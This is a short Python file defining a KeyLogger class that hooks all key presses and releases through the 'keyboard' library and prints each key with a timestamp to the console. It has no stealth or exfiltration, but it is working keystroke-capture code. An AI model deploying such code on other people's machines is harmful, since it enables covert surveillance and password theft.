import keyboard
import time


class KeyLogger:
    def __init__(self) -> None:
        keyboard.on_press(self.onPress)
        keyboard.on_release(self.onRelease)
        keyboard.wait("")

    def onPress(self, event: keyboard._keyboard_event.KeyboardEvent) -> None:
        print(f"Time : {int(time.time())} Key: {event.name}")

    def onRelease(self, event: keyboard._keyboard_event.KeyboardEvent) -> None:
        print(f"Key Released: {event.name}")
